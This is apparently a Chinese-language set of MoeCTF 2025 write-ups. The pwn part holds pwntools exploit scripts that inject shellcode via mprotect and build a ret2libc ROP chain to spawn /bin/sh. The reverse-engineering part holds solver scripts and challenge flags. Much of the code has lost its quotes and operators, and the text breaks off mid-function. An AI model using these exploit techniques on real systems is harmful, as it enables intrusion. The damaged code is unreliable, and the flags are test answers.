mprotect 是一个 POSIX 系统调用，用于修改指定内存区域的保护属性。它的函数原型（在 Linux 中）如下： int mprotect(void *addr, size_t len, int prot); addr：要修改保护属性的内存起始地址，必须是页面对齐的（通常是 4KB 的倍数，具体取决于系统页面大小）。len：要修改的内存区域长度（以字节为单位）。prot：新的保护标志，可以是以下值的组合（通过位或 | 运算）：- 1：PROT_READ：内存可读。 - 2：1PROT_WRITE：内存可写。- 4：PROT_EXEC：内存可执行。- 0：PROT_NONE：内存不可访问。这些权限可以通过位或运算（|）组合使用。例如：PROT_READ | PROT_WRITE = 1 | 2 = 3（可读可写）。PROT_READ | PROT_WRITE | PROT_EXEC = 1 | 2 | 4 = 7（可读、可写、可执行）。PROT_NONE = 0（无权限）。 那现在我们的选择是 7 给 s 设置了可读可写可执行的权限，现在向 s 地址处读入一段代码 from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。# 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。io = connect(127.0.0.1, 31412) # 与在线环境交互。# 生成 /bin/sh 的 shellcode（汇编代码）shellcode_asm = shellcraft.amd64.linux.sh()# 使用 asm() 汇编成二进制shellcode_bin = asm(shellcode_asm)io.sendafter(bChoose wisely!, b4 )payload = p32(shellcode_bin) io.sendafter(byou just set., payload)io.interactive() # 手动接收 flag。 输出： moectfp0WErFUL_sh3I1c0D3-C@N_Do-AnyTHing9a63c prelibc 接下来读 0x100 字节到 buf printf: 606F0system: 50D70 已知：printf：0x7935fa860100 将可执行文件的 libc.so.6 依赖替换为我们的 libc.so.6： # 修改二进制文件的库搜索路径patchelf --set-interpreter ~/MoeCTF2025/prelibc/ld-linux-x86-64.so.2 ./pwn # 指定动态链接器patchelf --set-rpath ~/MoeCTF2025/prelibc ./pwn # 指定 libc.so.6的搜索路径 (MoeCTF-env) yang@yang:~/MoeCTF2025/pwn/prelibc$ strings libc.so.6 |grep UbuntuGNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.10) stable release version 2.35. from pwn import * p = process(./pwn)libc = ELF(./libc.so.6)elf = ELF(./pwn)system = libc.sym[printf]#这里的system可以替换成别的函数，用于搜索偏移print(hex(system))if args.G: gdb.attach(p) p.interactive() 左边可以看到注入的 system 地址是 0x7bde73e50780，而程序也跳转到这里执行，但是并不是 system 命令 说明我们计算的地址出错了。 # 下载特定版本的 glibc 源码wget https://ftp.gnu.org/gnu/glibc/glibc-2.35.tar.gztar -xf glibc-2.35.tar.gzcd glibc-2.35# 编译（需要指定安装目录）mkdir build cd build../configure --prefix=/home/yang/MoeCTF2025/pwn/prelibc/glibc-2.35-installmake -j$(nproc)make install# 获取 ld-linuxcp /home/yang/MoeCTF2025/pwn/prelibc/glibc-2.35-install/lib/ld-linux-x86-64.so.2 ./ld-linux-x86-64.so.2 patchelf --set-interpreter ~/MoeCTF2025/prelibc/ld-linux-x86-64.so.2 ./pwn # 指定动态链接器patchelf --set-rpath ~/MoeCTF2025/prelibc ./pwn # 指定 libc.so.6的搜索路径 rodata:00000000001D8678 aBinSh db /bin/sh,0 在 x86-64 调用约定中，system 的第一个参数通过 rdi 寄存器传递。因此，需要一个 ROP gadget 设置 rdi bin_sh_address，然后跳转到 system。 终于成功了 from pwn import *context(arch=amd64, os=linux, log_level=debug)# 直接启动 gdb 调试io = connect(127.0.0.1,19063)io.recvuntil(bthe location of printf: )printf_address = io.recvline().strip() # 读取 `printf` 的地址。printf_address = int(printf_address, 16) # 转换为整数。print(hex(printf_address))system_add = 0x50d70printf_add = 0x606f0shell_add = 0x1D8678pop_rdi_ret_add = 0x2a3e5ret_add = 0x404f0system_address = printf_address + system_add - printf_addshell_address = printf_address + shell_add - printf_addpop_rdi_ret = printf_address + pop_rdi_ret_add - printf_addret = printf_address + ret_add - printf_addpayload = cyclic(64) # 填充 bufferpayload += cyclic(8) # 填充 rbppayload += p64(pop_rdi_ret) # 先调用 pop rdi; retpayload += p64(shell_address) # 弹出 shell_address 到 rdipayload += p64(ret) # 栈对齐payload += p64(system_address) # 跳转到 systemio.sendafter(b , payload)io.interactive() # 手动接收 flag。 from pwn import *context(arch=amd64, os=linux, log_level=debug)context.terminal = [tmux, splitw, -h] # 如果你用 tmux（推荐）# 直接启动 gdb 调试io = process(./pwn)gdb.attach(io, b *(main+84)b *(vuln+71)layout asmlayout regs)io.recvuntil(bthe location of printf: )printf_address = io.recvline().strip() # 读取 `printf` 的地址。printf_address = int(printf_address, 16) # 转换为整数。print(hex(printf_address))system_add = 0x50d70printf_add = 0x606f0shell_add = 0x1D8678pop_rdi_ret_add = 0x2a3e5ret_add = 0x404f0system_address = printf_address + system_add - printf_addshell_address = printf_address + shell_add - printf_addpop_rdi_ret = printf_address + pop_rdi_ret_add - printf_addret = printf_address + ret_add - printf_addpayload = cyclic(64) # 填充 bufferpayload += cyclic(8) # 填充 rbppayload += p64(pop_rdi_ret) # 先调用 pop rdi; retpayload += p64(shell_address) # 弹出 shell_address 到 rdipayload += p64(ret) # 栈对齐payload += p64(system_address) # 跳转到 systemio.sendafter(b , payload)io.interactive() # 手动接收 flag。 boom 31 行：需要 v6 等于 0，同时 v5 等于 canary Pwntoolsprocess() # 创建本地进程对象remote(IP,port) # 创建远程连接对象（TCP/UDP）listen() # 创建监听端口（用于反向连接）recv(n) # 接收 n 个字节recvline() # 接收一行数据（直到换行符） recvall() # 接收所有数据直到 EOFrecvrepeat(timeout) # 接收数据直到超时send() # 发送数据 sendline() # 发送一行数据（带换行符）sendafter(delim,data) # 在收到delim后发送datasendlineafter(delim, data)u64() # 字节流转换成64位无符号整数u32() # 字节流转换成32位无符号整数p64() # 64位无符号整数转换为8字节的字节流p32() # 32位无符号整数转换为4字节的字节流process.interactive() # 进入交互模式（获得Shell之后） 举例： from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。# 有时我们需要在本地调试运行程序，需要配置 context.terminal。详见入门指北。# io = process(./pwn) # 在本地运行程序。# gdb.attach(io) # 启动 GDBio = connect(127.0.0.1, 53216) # 与在线环境交互。io.sendline(b114511) # 什么时候用 send 什么时候用 sendline？payload = p32(0xdeadbeef) # p32(0xdeadbeef)、b\\xde\\xad\\xbe\\xef、bdeadbeef 有什么区别？ # 你看懂原程序这里的检查逻辑了吗？payload += bshuijiangui # strcmpio.sendafter(bpassword., payload) # 发送！通过所有的检查。io.interactive() # 手动接收 flag。 from pwn import * # 导入 pwntools。context(arch=amd64, os=linux, log_level=debug) # 一些基本的配置。io = connect(127.0.0.1, 54174)io.recvuntil(Here is the hint.)data = io.recvn(8) # 接收八个字节数据num = u64(data)io.recvuntil(b)io.sendline(str(num).encode()) # io.interactive() 随机种子： srandom(v0) 使用 time(0LL)（当前时间戳，单位秒）作为种子。 这意味着 canary (int)random() % 114514 的值在程序启动时是可预测的（取决于启动时间）。 时间依赖： 由于 time(0LL) 返回的是一秒级的时间戳，多次快速启动程序可能得到相同的种子。 这为 canary 的猜测提供了机会。 Linux知识文件描述符fd当进程打开新文件时，内核会： 在进程的文件描述符表中查找第一个空闲位置 将该位置的索引作为fd返回 在系统级打开文件表中创建相应条目 特殊fd： 0：stdin 1：stdout 2：stderr 相关系统调用： // 打开文件，返回fdint open(const char *pathname, int flags); // 关闭fdint close(int fd);// 从fd读取ssize_t read(int fd, void *buf, size_t count); // 写入fdssize_t write(int fd, const void *buf, size_t count); int dup(int oldfd); // 复制fdint dup2(int oldfd, int newfd); // 复制fd到指定值","categories":["CTF"]},{"title":"MoeCTF 2025 Reverse","path":"/MoeCTF 2025-1/","content":"逆向部分 题目speedDid you see my little pony? She runs really fast...附件：speed.zip 运行 speed.exe ，窗口一晃而过 直接使用 IDA Pro 打开，注意到主函数中有 Winmain 函数 跳转到 Winmain 函数 Winmain 是Windows 桌面程序的主函数 注意到29行 ShowWindow 命令，和32行 DestroyWindow 。 之间只有 sleep(1) 就是这个函数让窗口一晃而过。在这下断点，执行。窗口停下。 微软 Visual C++ 中 Sleep() 参数单位是 毫秒 大写S Linux 中 sleep() 参数单位是秒 小写s 标准 C 中 sleep() 参数单位也是秒 小写s Base打开程序，提示输入 flag，随便输入一个，程序退出 用 IDA 打开程序 32行，Buffer 认为是输入，v4 是输入长度， v11 是长为16的字符数组 33行，v7 与 一串神秘字符比较，猜测 v7 需要等于这串字符 注意到这串字符 结尾是 =，查看 32 行的函数，可以判断应该是个 base64 编码函数 import base64ciphertext = bW9lY3Rme1kwdV9DNG5fRzAwZF9BdF9CNDVlNjQhIX0=b = base64.b64decode(ciphertext) print(b.decode()) 解码，即得到 flag catch flag db geoi~lq~bcyUcyUkUlkaoUlfkmw,0 enc 是一个很简单的异或函数，一切都很简单，写一个简单的 c++ 程序模拟 #includeiostream#includestringstd::string flag = geoi~lq~bcyUcyUkUlkaoUlfkmw;char enc(char a) return a ^ 0x11;int main() int len = flag.size(); for(int i = 0; i len; i++) flag[i] = enc(flag[i]); std::cout flag std::endl; return 0; 运行结果是： vt~xo`osrhDrhDzDzp~Dwz|f 很显然不是 flag 结合提示 IDA pro 9.0 推出了针对 C++ exception 的优化但是这并不意味着所有的 try catch 都能被正确反编译 这意味着需要读汇编 注意到下面这段汇编代码，有一个比上面的 flag 更像 flag 的字符串 islower， isupper函数表示分大小写需要对字符进行不同处理（特殊字符不处理） 总而言之，重新写一个 c++ 程序 #includeiostream#includestringstd::string flag = zbrpgsF4z3_Ge1px_jvgu_@sybjre_qrfhjn;int main() int len = flag.size(); for(int i = 0; i len; i++) if(islower(flag[i])) flag[i] = (flag[i] - 84) % 26 + a; else if(isupper(flag[i])) flag[i] = (flag[i] - 52) % 26 + A; std::cout flag std::endl; return 0; 运行结果： moectfS4m3_Tr1ck_with_@flower_desuwa moe_upx直接将文件拖入 IDA 发现无法反汇编，使用 upx 脱壳 upx -d moe.exe 然后 moe.exe 就能正常反编译了 使用 fgets 读入一行，存储到 Buffer，然后对Buffer每个字符与 0x21 异或，再与后一个字符异或，得到 v14 重写： #includeiostream#includestringint main() std::string flag; std::cin flag; int len = flag.size(); if(len) for(int i = 0; i len; i++) flag[i] = flag[i] ^ 0x21; if(i len - 1 ) flag[i] = flag[i] ^ flag[i+1]; std::cout flag std::endl; return 0; 看比较部分： 只有当 v14 与 v10 这两个数组 前35 个字符一样时，才不会输出表示失败的字符串 现在看看 v10 是什么，就是一些字节数据 32个63位整数 SSE 指令（_mm_load_si128）加载 128 位数据（xmmword） 到内存。 以十六进制按顺序排列 ：232B2736333C0348640B1D767B100B3A3F65762915371C0A08213E3C3D160B24（小端序） 仔细一看，除了 v10 数组以外，在下面还有 v11 , v12 , v13 分别为 41 , 36 , 86（十进制） 此外提示消息还提到 fget会连同换行符一起读入。换行符 的 ASCII 码值为 0x10 ，与0x21 异或结果为 0x2B 最终应该在原十六进制数后加上 29 24 56 2B 最后是逆向获取 flag 的过程。 从后往前，对每个字符，先与后一个字符异或，再与 0x21 异或 特殊情况：最后一个字符直接与 0x21 异或（也是迭代的第一个字符） # 36 27 2B 23 # 48 03 3C 33 # 76 1D 0B 64 # 3A 0B 10 7B # 29 76 65 3F # 0A 1C 37 15# 3C 3E 21 08# 24 0B 16 3D# 小端序# d41 d36 d86 - 29 24 56# A^21 = 2B fget还会在末尾有 x = 232B2736333C0348640B1D767B100B3A3F65762915371C0A08213E3C3D160B242924562Bs = bytes.fromhex(x)s_list = list(s)length = len(s_list)print(s_list)for i in range(length): if i == 0: s_list[length - i - 1] = s_list[length - i - 1] ^ 0x21 else: s_list[length - i - 1] = s_list[length - i] ^ s_list[length - i - 1] s_list[length - i - 1] = s_list[length - i - 1] ^ 0x21print(s_list)ascii_str = bytes(s_list).decode(ascii) print(ascii_str) 输出结果： moectfY0u_c4n_unp4ck_It_vvith_upx ez3试运行： 现在拖入 IDA 查看 第19行：要求是 42 个字符 第27行：符合 moectf...... 的格式 else分支应该是对 v11 ：flag 进行某种变换 第40行：注意到 v5 使用在 使用 end 迭代器，且长度为 1 ，猜测与 有关 第41行：注意到 v6 使用在 使用 begin 迭代器，且长度为 7 ，猜测与 moectf 有关 那现在很自然可以认为最终 v12 应该是flag 中 内的内容 最终要想输出 OK，需要 v5 1，即 check(v12) 返回 1 查看 check() 函数 a 数组： 现在可以开始求解 flag 了 先重写一下 check 函数 def is_flag(flag): b = [0] * 34 for i in range(34): b[i] = 47806 * (ord(flag[i]) + i) if i != 0: b[i] = b[i] ^ b[i-1] ^ 0x114514 b[i] = b[i] % 51966 if b[i] != ciphertext[i]: return False return True 使用 Z3 求解 from z3 import *ciphertext = [ 0x0B1B0, 0x5678,0x7FF2,0x0A332,0x0A0E8,0x364C,0x2BD4,0x0C8FE,0x4A7C,0x18,0x2BE4,0x4144,0x3BA6,0x0BE8C,0x8F7E,0x35F8,0x61AA,0x2B4A,0x6828,0x0B39E,0x0B542,0x33EC,0x0C7D8,0x448C,0x9310,0x8808,0x0ADD4,0x3CC2,0x796,0x0C940,0x4E32,0x4E2E,0x924A,0x5B5C]# 创建 Z3 求解器solver = Solver()# 定义 flag 字符和中间变量 b，使用 BitVec 类型（32 位）flag = [BitVec(fflag_i, 32) for i in range(34)]b = [BitVec(fb_i, 32) for i in range(34)]# 添加约束：flag 字符在 ASCII 可打印字符范围内 (32 到 126)for i in range(34): solver.add(flag[i] = 32, flag[i] = 126)# 根据 is_flag 函数的逻辑添加约束for i in range(34): temp = 47806 * (flag[i] + i) if i == 0: solver.add(b[i] == temp % 51966) else: temp = temp ^ b[i-1] ^ 0x114514 solver.add(b[i] == temp % 51966) solver.add(b[i] == ciphertext[i])# 存储所有解solutions = []while solver.check() == sat: model = solver.model() # 提取 flag 字符 flag_vals = [model[flag[i]].as_long() for i in range(34)] flag_str = .join(chr(val) for val in flag_vals) solutions.append(flag_str) # 添加排除当前解的约束 solver.add(Or([flag[i] != flag_vals[i] for i in range(34)])) # 可选：限制最大解的数量，避免过多输出 if len(solutions) = 100: # 限制最多 100 个解 break# 输出所有解if solutions: for idx, sol in enumerate(solutions, 1): print(fidx: sol)else: print(无解) 输出： 注意到多个解满足检查，逐个提交，第二个 flag 正确 ezandroid 注意到 44 行，输入 文本，转换成 String ，Base64 编码后需要与 上面这串字符相等 在 Java（以及安卓开发中常见的语言如 Kotlin）中，trim() 是一个字符串方法，用于移除字符串首尾的空白字符，包括空格（ ）、制表符（\\t）、换行符（ ）、回车符（\\r）等。 import base64s = bW9lY3Rme2FuZHJvaWRfUmV2ZXJzZV9JNV9lYXN5fQ==b = base64.b64decode(s) # Base64 解码print(b.decode()) base64 解码，即可 moectfandroid_Reverse_I5_easy flower 花指令 直接拖入 IDA solve 函数无法反编译 格式检查部分： 最下方：右侧是 格式错误分支，左侧是我们需要关心的地方 loc_4048E5: jz short Label jnz short Label call near ptr Label+1Label: lea rax, [rbp+var_59] _Z5solveNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE endp ; sp-analysis failed jz 和 jnz 表示为 0 和不为 0 时均跳转到 Label call 指令不会被执行到，并且在反编译时对反编译器造成干扰，使用 NOP 指令替换 现在能成功反编译 solve函数 现在能发现格式检查部分的逻辑 查看 0x4048F2 地址处的汇编代码 这里看到涉及到 begin (7)和 end (1)的迭代器，可以猜测这里对格式进行处理， 然后将长度与 20h ，即 32比较，可以猜测 flag的 中字符串长度为 32 输出变了，说明猜测正确 现在 想想如何输出 Win 将每个字符使用 encode 函数编码，然后与 enc 比较，不同会输出 Wrong，刚好 32 个十六进制数 enc:4F 1A 59 1F 5B 1D 5D 6F 7B 47 7E 44 6A 07 59 67 0E 52 08 63 5C 1A 52 1F 20 7B 21 77 70 25 74 2B key 23h key 是一个全局变量， 每次执行都会加 1 逆向这个 encode 函数很简单 s = for i in range(min(len(enc), length)): s += chr(enc[i] ^ (key + i)) # 逆向异或 但是仅仅这样的话会输出不可打印字符。 原因是 key 不一定仅仅在这里被使用 ，可能在别的地方被改过，已经不是最初的指了。 搜索 key 发现在 main 函数中也被使用，虽然我们没能反编译出。 查看发现 key 会与 0xA 异或，现在 key = 0x23 ^ 0x0A enc = [0x4F ,0x1A ,0x59 ,0x1F ,0x5B ,0x1D ,0x5D ,0x6F ,0x7B ,0x47 ,0x7E ,0x44 ,0x6A ,0x07, 0x59 ,0x67 ,0x0E ,0x52 ,0x08,0x63 ,0x5C ,0x1A ,0x52 ,0x1F ,0x20 ,0x7B ,0x21 ,0x77 ,0x70 ,0x25 ,0x74 ,0x2B]s = for i in range(min(len(enc), length)): s += chr(enc[i] ^ (key + i)) # 逆向flag = moectf + s + print(flag) 输出： moectff0r3v3r_JuMp_1n_7h3_a$m_a9b35c3c 本题中还使用 ptrace ，实现禁止跟踪进程，用于对抗动态调试 A cup of tea TEA 加密 花了半天才找到 主函数 sub_14001109B 函数： 可以看出这是一个 TEA 加密算法，使用 DELTA = 0x114514 逆向这个过程即可 from ctypes import c_uint32def decrypt_block(left, right, k): sum_val = 0x114514 * 32 # sum = DELTA * rounds for _ in range(32): right = c_uint32(right - ((k[3] + (left 5)) ^ (sum_val + left) ^ (k[2] + 16 * left))).value left = c_uint32(left - ((k[1] + (right 5)) ^ (sum_val + right) ^ (k[0] + 16 * right))).value sum_val -= 0x114514 return left, rightv9 = [ 2026214571, # 0x78B1DCAB 578894681, # 0x22849959 1193947460, # 0x472A8944 -229306230, # 0xF29BFC6A 73202484, # 0x045D0374 961145356, # 0x394A0E0C -881456792, # 0xCB4B6B68 358205817, # 0x1559FC79 -554069347, # 0xDEF4F19D 119347883, # 0x071C1F2B]v8 = [ 289739801, # 0x1142CB19 427884820, # 0x19829914 1363251608, # 0x51435998 269567252, # 0x10119914]# 解密 v9 的每个块（5 个块，每个块 8 字节）decrypted = []for i in range(0, 10, 2): left = c_uint32(v9[i]).value # 转换为无符号 32 位整数 right = c_uint32(v9[i + 1]).value dec_left, dec_right = decrypt_block(left, right, v8) decrypted.append(dec_left) decrypted.append(dec_right)# 将解密后的 DWORD 转换为字节flag_bytes = []for val in decrypted: flag_bytes.extend(val.to_bytes(4, byteorder=little))# 转换为 ASCII 字符串flag = bytes(flag_bytes).decode(ascii, errors=ignore)print(Decrypted Flag:, flag) 输出： moectfh3r3_4_cuP_0f_734_f0R_y0U!!!!!! ezpy.pyc pyc文件是 Python 字节码（Bytecode）的编译缓存文件。 使用反编译工具 uncompyle6 pip install uncompyle uncompyle filename # 直接使用 # 加密函数def caesar_cipher_encrypt(text, shift): result = [] for char in text: if char.isalpha(): if char.islower(): new_char = chr((ord(char) - ord(a) + shift) % 26 + ord(a)) else: if char.isupper(): new_char = chr((ord(char) - ord(A) + shift) % 26 + ord(A)) result.append(new_char) else: result.append(char) else: return .join(result) 注意到 小写字母映射到 另一个小写字母，大写字母映射到另一个大写字母，其他字符不变 那这个加密函数的解密就很简单了 plaintext = user_inputshift = 114514encrypted_text = caesar_cipher_encrypt(plaintext, shift)if encrypted_text == wyomdpI0e_Ux0G_zim: print(Correct!!!!) 现在试着写逆向函数： def decrypt(ciphertext,shift): text = [] for char in ciphertext: if char.isalpha(): if char.islower(): old_char = chr((ord(char) - ord(a) - shift) % 26 + ord(a)) else: if char.isupper(): old_char = chr((ord(char) - ord(A) - shift) % 26 + ord(A)) text.append(old_char) else: text.append(char) else: return .join(text) ciphertext = wyomdpI0e_Ux0G_zimshift = 114514plaintext = decrypt(ciphertext,shift)print(plaintext) 输出： moectfY0u_Kn0W_pyc have_fun试运行 拖入 IDA ，查看反编译代码。40~43行非常熟悉，这是在计算 String 的长度 v5，可以看到如果长度 大于 32 就会执行很长一块代码 大于32时会执行很长一串块代码，从前往后循环处理32字节的字符，剩余的字符，分别与 0x2A 异或加密 这就是加密逻辑，那接下来就应该是比较逻辑 注意到 83 行的 break ，这应该是比较中不愿意看到的，触发条件就是加密后的数组需要与 aGeoiLqbj 数组一致（仅需前 len(aGeoiLqbj)部分一致 ） 注意到 87 行 v17，上面提到这个变量会触发 break ，在这行 if条件中又出现，无论如何，不能让这个 if 语句执行，这个语句触发的第二个条件是加密后的数组长度不等于16，所以我们输入的 flag 长度应该为 16 查看 aGeoiLqbj ： 逆向解密： aGeoiLqbj = [0x47,0x45,0x4F,0x49,0x5E,0x4C,0x51,0x62,0x6A,0x5C,0x1E,0x75,0x4C,0x7F,0x44,0x57]length = len(aGeoiLqbj)# 逐字符 XOR 加密# for i in range(length):# encrypted_text[i] = String[i] ^ 0x2A; # 每个字符 XOR 0x2Aplaintext = []for i in range(length): plaintext.append(chr(aGeoiLqbj[i] ^ 0x2A))plaintext = .join(plaintext)print(plaintext) 输出： moectfH@v4_fUn mazegame直接执行： 拖入 IDA 76 行：应该是超出迷宫范围 81行：应该是撞墙逻辑（对应字符串处有 %d，%d，输出两个整数，就是之前截图里的撞墙提示坐标） 86行：到达终点 现在查看这个 byte_140005660 ，发现在 13 行调用过的函数里被初始化过。 bool dfs(int x, int y, std::vectorstd::string maze, std::string path) // 到达目标点 if (x == 32 y == 15) return true; // 标记当前位置为已访问 maze[y][x] = 1; // 四个方向：下、右、左、上 const int dx[] = 0, 1, -1, 0; const int dy[] = 1, 0, 0, -1; const char dir[] = S, D, A, W; // 尝试四个方向 for (int i = 0; i 4; i++) int nx = x + dx[i]; int ny = y + dy[i]; // 检查新位置是否有效且未访问 if (nx = 0 nx maze[0].length() ny = 0 ny maze.size() maze[ny][nx] == 0) path += dir[i]; if (dfs(nx, ny, maze, path)) return true; // 回溯：如果这条路走不通，删除这一步 path.pop_back(); return false;int main() std::vectorstd::string maze = v9; // 复制一份地图，避免修改原始数据 std::string path; if (dfs(1, 1, maze, path)) std::cout 找到路径: path std::endl; std::cout 路径长度: path.length() std::endl; else std::cout 没有找到路径！ std::endl; return 0; upx_revenge使用 upx -d 解压缩： 提示说查看 文件的 UPX 特征 左边是题目的二进制，右边是一个我自己使用 upx 压缩的 exe 文件 对比，发现少了 UPX!，把它补上，就能正常 脱壳 脱壳成功，现在就是逆向代码的过程了。 xor_base64 = .join(chr(ord(c) ^ 0xE) for c in ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/)target = lY7bW=\\\\ck?eyjX7]TZ\\\\CVbh\\\\tOyTH6jH7XmFifG]H7index_map = c: i for i, c in enumerate(xor_base64)flag = i = 0while i len(target): group = target[i:i+4] pad = group.count(=) # 处理填充 chars = [c for c in group if c != =] # 如果有填充，补齐索引 while len(chars) 4: chars.append(xor_base64[0]) try: idx = [index_map[c] for c in chars] value = (idx[0] 18) | (idx[1] 12) | (idx[2] 6) | idx[3] flag += chr((value 16) 0xFF) if pad 2: flag += chr((value 8) 0xFF) if pad 1: flag += chr(value 0xFF) except KeyError as e: print(fError: Character e not in encoding table) break i += 4# 去除末尾多余字符print(fFlag: flag.rstrip(chr(0))) moeaY0u_Re4l1y_G00d_4t_Upx!!!猜测：moectfY0u_Re4l1y_G00d_4t_Upx!!! guess反编译： 发现需要 guess 的是一个随机数，那很难猜了。最多只能猜十次，范围是0~99，运气好一点能直接猜到。 但是我直接修改这个 count 9 为 count 0x70，即可 moectfRrRRccCc44$$_w1th_fl0w3r!!_3c6a11b5 chall 暂时放弃 调试一下，发现： 381082: The instruction at 0x381082 referenced memory at 0x0. The memory could not be written - 00000000 (exc.code c0000005, tid 30616) 查看 0x381082 eax 之前被清零，现在往地址 0 处写 0 ，这是不允许的，难怪会崩溃。 查看这段代码的被引用位置： 现在很清晰了，检测到被调试，于是走到会引发错误的分支 现在反编译这段代码，发现更恐怖的事情，就是反调试手段不止这一个 现在就能直接动态调试： 63656F6D moec747B6674 tft5F736968 his_615F7369 is_a616C665F _fla00007D67 g 百思不得其解，但是后面发现了 TLScallback ，还是经验太少了，还以为是加载什么 dll 的函数 TLS（Thread Local Storage，线程局部存储）回调函数是 Windows 可执行文件（PE 文件）中用于处理线程或进程初始化终止的特殊函数。它定义在 PE 文件的 .tls 节中，通常在程序主入口点（如 main 或 WinMain）之前或进程线程退出时自动调用。TLS 回调函数常用于： 初始化：在进程或线程启动时执行特定操作（如加载动态库、替换函数地址）。 反调试：检测调试器或防止逆向分析。 资源管理：分配或释放线程局部存储。 最逆天的一集： TLS（线程局部存储）回调函数，在进程线程初始化（a2 1）或终止（a2 2）时执行。 a2 1（DLL_PROCESS_ATTACH）： 调用 sub_401570 替换 strncmp（用 sub_401510）和 strlen（用 sub_4014C0）。 sub_401510 成为程序中 strncmp 的实际实现。 a2 2（DLL_PROCESS_DETACH）： 检测调试器（IsDebuggerPresent 或 NtQueryInformationProcess）。 如果检测到调试器，写入 MEMORY[0] 0，触发崩溃（反调试机制）。 ez_DESfrom Crypto.Cipher import DESimport secretsimport stringflag = moectf???characters = string.ascii_letters + string.digits + string.punctuationkey = ezdes+.join(secrets.choice(characters) for _ in range(3))assert key[:5] == ezdeskey = key.encode(utf-8)l = 8def encrypt(text, key): cipher = DES.new(key, DES.MODE_ECB) padded_text = text + (l - len(text) % l) * chr(len(text)) data = cipher.encrypt(padded_text.encode(utf-8)) return datac = encrypt(flag, key)print(c =, c)# c = b\\xe6\\x8b0\\xc8m\\t?\\x1d\\xf6\\x99sA\\xce \\rN\\x83z\\xa0\\xdc\\xbc\\xb8X\\xb2\\xe2q\\xa4\\xfc\\x07 moectf_Ju5t envmEra+e.! two cup of tea 第 40 行读取输入，从这开始看： strcspn 返回 Buffer 中第一个 的位置，即长度，要求长度小于 144，然后将输入字符串末尾 改为 \\0 第 51 行：调用函数，第一个参数与输入有关，第二个参数很神秘，第三个参数 来自前面 37 行的函数，这个函数调用时间在接收输入之前，可以判断与我们的输入无关。所以在这下断点，看看它是什么 是 2 ? 但是查看 v10 ，就是 上面那串 moectf!! 这个反编译应该是有问题，还得读汇编代码 注意到在调用函数之前，将四个数 xmm0 xmm1 12345678h 9ABCDEFh 放到了栈上，前两个是输入的字符串参数，后两个是两个固定的数。 在函数内看看它们是什么 第三个参数 a3 ：指向一个栈中地址，以小端序就是 0x63656F6D, 0x21216674, 0x12345678, 0x9ABCDEF0（这里只给出前16个字节，之后会解释为什么） 接下来应该就是对 输入进行加密，注意到对 a3 以及 v26 都指第三个参数，即刚刚发现的指针 它在整个加密过程中迭代，但是迭代结果会 3，这就说明这个指针只会指向前 4 个 4 字节数 (uint) 很容易猜到，这是 TEA 加密的密钥，但后面的加密过程有点变态，将输入的字符串 分割成 10 组，从前往后加密，并且循环 11 次 uint32_t encipher(uint32_t* v, const uint32_t* key) uint32_t v0 = v[0], v1 = v[1], v2 = v[2], v3 = v[3], v4 = v[4]; uint32_t v5 = v[5], v6 = v[6], v7 = v[7], v8 = v[8], v9 = v[9]; uint32_t sum = 0, delta = 0x9E3779B9; for (unsigned int i = 0; i 11; ++i) // 11 轮 uint32_t k_idx = (sum 2) 3; uint32_t k0 = key[k_idx], k1 = key[k_idx ^ 1], k2 = key[k_idx ^ 2], k3 = key[k_idx ^ 3]; v0 += (((v1 2) ^ (v9 5)) + ((v1 3) ^ (v9 4))) ^ ((v9 ^ k0) + (v1 ^ sum)); v1 += (((v2 2) ^ (v0 5)) + ((v2 3) ^ (v0 4))) ^ ((v0 ^ k1) + (v2 ^ sum)); v2 += (((v3 2) ^ (v1 5)) + ((v3 3) ^ (v1 4))) ^ ((v1 ^ k2) + (v3 ^ sum)); v3 += (((v4 2) ^ (v2 5)) + ((v4 3) ^ (v2 4))) ^ ((v2 ^ k3) + (v4 ^ sum)); v4 += (((v5 2) ^ (v3 5)) + ((v5 3) ^ (v3 4))) ^ ((v3 ^ k0) + (v5 ^ sum)); v5 += (((v6 2) ^ (v4 5)) + ((v6 3) ^ (v4 4))) ^ ((v4 ^ k1) + (v6 ^ sum)); v6 += (((v7 2) ^ (v5 5)) + ((v7 3) ^ (v5 4))) ^ ((v5 ^ k2) + (v7 ^ sum)); v7 += (((v8 2) ^ (v6 5)) + ((v8 3) ^ (v6 4))) ^ ((v6 ^ k3) + (v8 ^ sum)); v8 += (((v9 2) ^ (v7 5)) + ((v9 3) ^ (v7 4))) ^ ((v7 ^ k0) + (v9 ^ sum)); v9 += (((v0 2) ^ (v8 5)) + ((v0 3) ^ (v8 4))) ^ ((v8 ^ k1) + (v0 ^ sum)); sum += delta; // 加密：sum 递增 v[0] = v0; v[1] = v1; v[2] = v2; v[3] = v3; v[4] = v4; v[5] = v5; v[6] = v6; v[7] = v7; v[8] = v8; v[9] = v9; return v7; // 返回 v[7] 仅仅使用 加减异或移位 的加密，是可以复原的。写出解密函数 void decipher(uint32_t* v, const uint32_t* key) // 解密函数 uint32_t v0 = v[0], v1 = v[1], v2 = v[2], v3 = v[3], v4 = v[4]; uint32_t v5 = v[5], v6 = v[6], v7 = v[7], v8 = v[8], v9 = v[9]; uint32_t sum = 0x9E3779B9 * 11, delta = 0x9E3779B9; for (unsigned int i = 0; i 11; ++i) uint32_t k_idx = (sum 2) 3; uint32_t k0 = key[k_idx], k1 = key[k_idx ^ 1], k2 = key[k_idx ^ 2], k3 = key[k_idx ^ 3]; // 逆序减法（从 v9 到 v0，反转依赖） v9 -= (((v0 2) ^ (v8 5)) + ((v0 3) ^ (v8 4))) ^ ((v8 ^ k1) + (v0 ^ sum)); v8 -= (((v9 2) ^ (v7 5)) + ((v9 3) ^ (v7 4))) ^ ((v7 ^ k0) + (v9 ^ sum)); v7 -= (((v8 2) ^ (v6 5)) + ((v8 3) ^ (v6 4))) ^ ((v6 ^ k3) + (v8 ^ sum)); v6 -= (((v7 2) ^ (v5 5)) + ((v7 3) ^ (v5 4))) ^ ((v5 ^ k2) + (v7 ^ sum)); v5 -= (((v6 2) ^ (v4 5)) + ((v6 3) ^ (v4 4))) ^ ((v4 ^ k1) + (v6 ^ sum)); v4 -= (((v5 2) ^ (v3 5)) + ((v5 3) ^ (v3 4))) ^ 